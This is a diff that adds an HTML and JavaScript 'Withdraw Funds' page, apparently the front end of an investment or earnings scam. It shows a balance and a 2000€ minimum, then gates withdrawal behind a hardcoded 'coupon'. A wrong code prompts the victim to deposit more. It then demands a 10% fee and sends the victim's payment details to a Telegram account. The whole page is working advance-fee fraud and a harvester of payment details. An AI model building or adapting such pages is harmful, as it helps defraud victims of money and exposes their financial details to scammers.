@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Withdraw</title>
+<style>
+  body{font-family:Arial,sans-serif;background:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvtdFyqzfN9BCsj-zmH7y_aNumJTa9uPcx4ESJJttliwsc0PCV5SQldWjA&s=10') no-repeat center/cover fixed;margin:0;padding:0}
+  h2{text-align:center;color:#ffcc00;font-size:2.5em;margin:20px 0;text-transform:uppercase;animation:fadeIn 2s}
+  .form-container{background:#ffffffcc;padding:30px;margin:50px auto;border-radius:10px;width:90%;max-width:600px;box-shadow:0 4px 10px #0003;animation:slideUp 1.5s}
+  label{display:block;font-size:1.05em;margin-top:10px}
+  input,select,button{width:100%;padding:12px;margin-top:6px;border-radius:5px;border:1px solid #ccc;font-size:1em}
+  input[readonly]{background:#f1f1f1}
+  button{background:#007bff;color:#fff;cursor:pointer;transition:background .3s}
+  button:hover{background:#0056b3}
+  #welcomeMessage{text-align:center;color:#007bff;font-size:1.4em;margin-bottom:15px;animation:bounceIn 1.5s}
+  .hidden{display:none}
+  .banner{padding:12px;margin-top:15px;border-radius:5px;text-align:center;font-weight:bold}
+  .error{background:#f8d7da;color:#842029}
+  .success{background:#d1e7dd;color:#0f5132}
+  @keyframes fadeIn{0%{opacity:0}100%{opacity:1}}
+  @keyframes slideUp{0%{transform:translateY(30px);opacity:0}100%{transform:translateY(0);opacity:1}}
+  @keyframes bounceIn{0%{transform:scale(0)}50%{transform:scale(1.1)}100%{transform:scale(1)}}
+</style>
+</head>
+<body>
+
+<div class="form-container">
+  <div id="welcomeMessage">Welcome! Ready to withdraw your funds.</div>
+
+  <h2>Withdraw Funds</h2>
+  <p style="text-align:center"><strong>Note:</strong> Withdrawals are paid in <strong>EUR</strong>. Minimum amount is 2000€.</p>
+
+  <form id="withdrawForm">
+    <label for="amount">Amount to Withdraw (€):</label>
+    <input type="number" id="amount" name="amount" required min="2000" step="0.01" />
+
+    <label for="paymentType">Choose Payment Method:</label>
+    <select id="paymentType" name="paymentType" required>
+      <option value="" disabled selected>Select…</option>
+      <option>PayPal</option><option>Zelle</option><option>Cash App</option>
+      <option>Bitcoin</option><option>Ethereum</option><option>USDT</option>
+      <option>Litecoin</option><option>Dogecoin</option><option>Ripple (XRP)</option>
+      <option>Chime</option><option>Apple Pay</option><option>Google Pay</option>
+      <option>Venmo</option><option>Bank Wire</option><option>Wise</option>
+      <option>Revolut</option><option>Payoneer</option><option>Skrill</option>
+      <option>N26</option><option>Alipay</option>
+    </select>
+
+    <div id="detailWrapper" class="hidden">
+      <label id="detailLabel" for="paymentDetail"></label>
+      <input type="text" id="paymentDetail" name="paymentDetail" required />
+    </div>
+
+    <!-- coupon HIDDEN until requested -->
+    <div id="couponWrapper" class="hidden">
+      <label for="coupon">Withdrawal Coupon:</label>
+      <input type="text" id="coupon" name="coupon" placeholder="withraw coupon" />
+    </div>
+
+    <button type="submit" id="sendBtn">Send &amp; Confirm</button>
+  </form>
+
+  <!-- messages -->
+  <div id="msg" class="banner hidden"></div>
+
+  <!-- fee + approve -->
+  <div id="feeSection" class="hidden" style="text-align:center;margin-top:25px">
+    <p>You must pay a <strong>10 % transaction fee</strong> to approve this withdrawal.</p>
+    <button id="approveBtn">Approve &amp; Open Telegram</button>
+  </div>
+</div>
+
+<script>
+const paymentType=document.getElementById("paymentType");
+const detailWrapper=document.getElementById("detailWrapper");
+const detailLabel=document.getElementById("detailLabel");
+const detailInput=document.getElementById("paymentDetail");
+const couponWrapper=document.getElementById("couponWrapper");
+const msg=document.getElementById("msg");
+const feeSection=document.getElementById("feeSection");
+const approveBtn=document.getElementById("approveBtn");
+
+const labelMap={PayPal:"PayPal email address",Zelle:"Zelle-linked email/phone","Cash App":"$Cashtag",Bitcoin:"BTC wallet address",Ethereum:"ETH wallet address",USDT:"USDT (TRC20/ERC20) address",Litecoin:"LTC wallet address",Dogecoin:"DOGE address","Ripple (XRP)":"XRP address + tag",Chime:"Chime username","Apple Pay":"iMessage phone/email","Google Pay":"Google Pay address",Venmo:"@Venmo handle","Bank Wire":"IBAN / Account #",Wise:"Wise email",Revolut:"Revolut username",Payoneer:"Payoneer email",Skrill:"Skrill email",N26:"N26 IBAN",Alipay:"Alipay ID"};
+
+paymentType.addEventListener("change",()=>{const t=paymentType.value;if(t){detailLabel.textContent=`${labelMap[t]||"Payment details"}:`;detailInput.placeholder=labelMap[t]||"";detailWrapper.classList.remove("hidden");detailInput.required=true;}else{detailWrapper.classList.add("hidden");detailInput.required=false;detailInput.value="";}});
+
+function showMsg(text,ok){msg.textContent=text;msg.className=`banner ${ok?"success":"error"}`;msg.classList.remove("hidden");}
+
+async function loadUserBalance(){try{const r=await fetch('/user-info');if(r.status===401){showMsg("Please log in first.",false);return null;}const d=await r.json();document.getElementById("welcomeMessage").textContent=`Welcome ${d.fullName}! Your balance: €${d.balance.toFixed(2)}`;return d.balance;}catch{showMsg("Unable to load user info.",false);return null;}}
+let currentBalance=0;loadUserBalance().then(b=>currentBalance=b??0);
+
+document.getElementById("withdrawForm").addEventListener("submit",async e=>{
+  e.preventDefault();
+  msg.classList.add("hidden");
+  const amount=parseFloat(document.getElementById("amount").value);
+  if(amount<2000){showMsg("Minimum withdrawal amount is 2000€.",false);return;}
+  if(amount>currentBalance){showMsg("Insufficient balance.",false);return;}
+  if(!paymentType.value){showMsg("Please select a payment method.",false);return;}
+  if(!detailInput.value.trim()){showMsg("Please enter your payment details.",false);return;}
+
+  // If coupon not yet asked, reveal it and stop here
+  if(couponWrapper.classList.contains("hidden")){
+     couponWrapper.classList.remove("hidden");
+     showMsg("Enter your withdrawal coupon to proceed.",false);
+     return;
+  }
+
+  const coupon=document.getElementById("coupon").value.trim();
+  if(coupon!=="IWOKOLODAMI170"){showMsg("account approved please deposit to your wallet now.",false);return;}
+
+  try{
+    const res=await fetch('/withdraw',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({amount:amount.toString()})});
+    const text=await res.text();
+    if(!res.ok){showMsg(text||"Withdrawal failed. Please try again.",false);return;}
+    showMsg("Withdrawal successful! Please pay the 10 % fee to complete approval.",true);
+    feeSection.classList.remove("hidden");
+  }catch{showMsg("Network error, please try again later.",false);}
+});
+
+approveBtn.addEventListener("click",()=>{
+  const amount=document.getElementById("amount").value;
+  const payMethod=paymentType.value;
+  const payDetails=detailInput.value.trim();
+  const fee=(amount*0.10).toFixed(2);
+  const txt=encodeURIComponent(
+    `Hello DELUX OFFICIAL!\n`+
+    `I have withdrawn €${amount} via ${payMethod}.\n`+
+    `Payment details: ${payDetails}\n`+
+    `My 10% fee is €${fee}. Please send payment instructions so I can pay and approve my transaction.`
+  );
+  window.open(`https://t.me/Deluxcashearning/url?url=&text=${txt}`,'_blank');
+});
+</script>
+
+</body>
+</html>
